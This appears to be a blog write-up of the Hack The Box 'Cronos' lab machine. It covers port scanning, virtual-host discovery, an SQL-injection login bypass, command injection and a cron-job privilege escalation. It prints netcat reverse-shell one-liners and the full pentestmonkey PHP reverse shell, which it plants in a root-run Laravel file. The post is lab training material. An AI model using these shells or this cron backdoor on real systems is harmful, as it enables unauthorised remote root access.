---
title: "Cronos"
date: 2023-07-26T13:53:53+02:00
tags: ["privesc","web","linux"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with a website which has virtual hosting, as first vulnerabilty we found a login page with SQLi and a command injection which makes us achieve the RCE. The privesc in this machine takes place on a cronjob."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Cronos
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/cronos

![Untitled](/HTB/cronos-icon.png)

## Tools Used

- nmap
- gobuster
- ffuf

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
  36   │ PORT   STATE SERVICE REASON         VERSION
  37   │ 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ub
       │ untu Linux; protocol 2.0)
  38   │ | ssh-hostkey:
  39   │ |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
  40   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEq
       │ yHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJC
       │ qV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9Ka
       │ yOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEg
       │ Mycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwG
       │ qjIvWnTzXLL8TilZI6/PV8wPHzn
  41   │ |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
  42   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA
       │ ABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6
       │ eaxkgW6NBgBEggm3kfQ=
  43   │ |   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
  44   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnO
       │ DXvxQ1Dc+Zx
  45   │ 53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
  46   │ | dns-nsid:
  47   │ |_  bind.version: 9.10.3-P4-Ubuntu
  48   │ 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
  49   │ |_http-title: Apache2 Ubuntu Default Page: It works
  50   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
  51   │ | http-methods:
  52   │ |_  Supported Methods: GET HEAD POST OPTIONS
  53   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have three open ports, the **port 22** with a **ssh** up and running, the **port 53** with a **ISC BIND** and a **http** web page at the **port 80**.

## Enumeration

As always we are goin to focus on the webpage.

![Untitled](/HTB/cronos-1.png)

If we enter at the page we can observe Ubuntu Default Page and if we try to fuzz this page nothing helpful is found.

It’s seems that maybe there is virtual hosting at the http server but nmap doesn’t show any domain. One thing we can perform is a nslookup to the ip which help us to find the domain which the ip points.

```bash
nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
Server:		10.10.10.13
Address:	10.10.10.13#53

13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

We found a `cronos.htb` domain, let’s put `cronos.htb` on the `etc/hosts` directory in order to take a look a the website hosted there.

![Untitled](/HTB/cronos-2.png)

There are four links which point to websites out of our scope so there are not useful. Let’s do a quick fuzz.

```bash
gobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz | tee fuzz.save
```

```bash
===============================================================
2023/07/25 15:37:15 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 289]
/.html                (Status: 403) [Size: 290]
/.hta                 (Status: 403) [Size: 289]
/.hta.css             (Status: 403) [Size: 293]
/.hta.js              (Status: 403) [Size: 292]
/.hta.py              (Status: 403) [Size: 292]
/.hta.sh              (Status: 403) [Size: 292]
/.hta.php             (Status: 403) [Size: 293]
/.hta.txt             (Status: 403) [Size: 293]
/.hta.html            (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 294]
/.htaccess.php        (Status: 403) [Size: 298]
/.htaccess.html       (Status: 403) [Size: 299]
/.htaccess.js         (Status: 403) [Size: 297]
/.htaccess.py         (Status: 403) [Size: 297]
/.htaccess.css        (Status: 403) [Size: 298]
/.htaccess.sh         (Status: 403) [Size: 297]
/.htaccess.txt        (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 294]
/.htpasswd.txt        (Status: 403) [Size: 298]
/.htpasswd.php        (Status: 403) [Size: 298]
/.htpasswd.html       (Status: 403) [Size: 299]
/.htpasswd.css        (Status: 403) [Size: 298]
/.htpasswd.js         (Status: 403) [Size: 297]
/.htpasswd.py         (Status: 403) [Size: 297]
/.htpasswd.sh         (Status: 403) [Size: 297]
/css                  (Status: 301) [Size: 306] [--> http://cronos.htb/css/]
/favicon.ico          (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 2319]
/index.php            (Status: 200) [Size: 2319]
Progress: 16446 / 36920 (44.54%)
/js                   (Status: 301) [Size: 305] [--> http://cronos.htb/js/]
/robots.txt           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 24]
/server-status        (Status: 403) [Size: 298]
/web.config           (Status: 200) [Size: 914]
Progress: 36904 / 36920 (99.96%)
===============================================================
2023/07/25 15:43:27 Finished
===============================================================
```

The results are worthless, so the only thing we can do is to see if there are more virtual hosts with ffuf.

First I started without the -fw flag, and I see that the default responses have always 3534 words

```bash
ffuf -u http://10.10.10.13 -H "Host: FUZZ.cronos.htb" -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fw 3534  -o vhost | tee vhost.save
```

```bash
   1   │ [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 121ms]
   2   │     * FUZZ: www
   3   │
   4   │ [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2196ms]
   5   │     * FUZZ: admin
```

As the results shows admin, let’s see what we have at `admin.cronos.htb` but before we need to put it at `etc/hosts` file

![Untitled](/HTB/cronos-3.png)

It’s a login page and seems so bad constructed

## Exploiting

First I am going to try the common credentials but nothing is working.

The login page seem pretty vulnerable to SQLi so I tried a very simple injection

![Untitled](/HTB/cronos-4.png)

We have gain access as admin.

![Untitled](/HTB/cronos-5.png)

Once inside, we found a text box to execute **ping** or **traceroute** commands in the remote machine. 

![Untitled](/HTB/cronos-6.png)

This smells like command injection, so I tried to put commands between two semicolons in order to execute them in the remote machine.

Now, let’s set a nc listener and send a simple reverse shell with nc.

```bash
nc -e /bin/sh 10.10.14.20 4444
```

```bash
nc -lv 4444
```

This way doesn’t seem to work so maybe we are in front a older linux version. Let’s us this command instead.

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 4444 >/tmp/f
```

## Gaining an Initial Foothold

![Untitled](/HTB/cronos-7.png)

We are in now, let’s find the user’s flag

![Untitled](/HTB/cronos-8.png)

## Escalating Privilege

I tried to enumerate de sudo -l privileges but a password is requested.

Other thing we can do is to search for SUID files but before that I realized that maybe the thing which are going to let me privesc is a cron job because the machine name gives us a clue of that. So I build a bash script that help us to monitorize this type of scheduled tasks.

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>\]" | grep -v "Apple"
    old_process=$new_process
done
```

This script help us to see what scheduled processes are running on the background.

```bash
< [moniProc.sh] <defunct>
< [moniProc.sh] <defunct>
< [moniProc.sh] <defunct>
< [moniProc.sh] <defunct>
> /usr/sbin/CRON -f
> /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
> php /var/www/laravel/artisan schedule:run
< /usr/sbin/CRON -f
< /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
< php /var/www/laravel/artisan schedule:run
< [kworker/u2:30]
< [kworker/u2:3]
< [kworker/u2:4]
```

Once executed the script we can see that the **cron job** is executing the following command

```bash
/bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

This **bash command** is running **php** file at the **laravel directory**, as we know the cron jobs are executed as root so we only need to change the content of the artisan file in order to put a [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.20';  // CHANGE THIS
$port = 4445;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

We need to change the ip and the port to our listening ports.

Now only rests to set a listener and wait until the cronjob is executed.

```bash
nc -lv 4445
```

![Untitled](/HTB/cronos-9.png)

Let’s cat the **root’s flag**

![Untitled](/HTB/cronos-10.png)

**Thank you for reading, and happy hacking! 😄**